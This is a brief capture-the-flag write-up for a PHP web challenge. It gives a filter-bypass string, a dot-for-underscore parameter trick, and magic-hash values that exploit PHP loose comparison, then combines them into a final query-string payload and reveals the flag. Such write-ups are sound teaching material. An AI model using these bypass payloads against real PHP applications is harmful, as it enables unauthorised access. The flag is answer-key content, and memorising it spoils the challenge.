Step 1:
Pass step1=auditauditfsiiecfsiiec to retain "auditfsiiec" after replacement.

Step 2:
Use a dot to bypass the underscore filter: securi.code because php replaces . by _

Step 3 & 4:
These steps involve exploiting PHP's loose comparison with hashes.

Step 3: Pass a value that produces an md2 hash equal to "0": step3=2HlFqrdIKK6z

Step 4: Pass a value that produces a sha1 hash that matches itself: step4=0e00000000000000000000081614617300000000

Final payload : ?step1=auditauditfsiiecfsiiec&securi.code&step3=2HlFqrdIKK6z&step4=0e00000000000000000000081614617300000000

Flag : FSIIECTF{b881f27c5bde22254db00e3aec47d201}
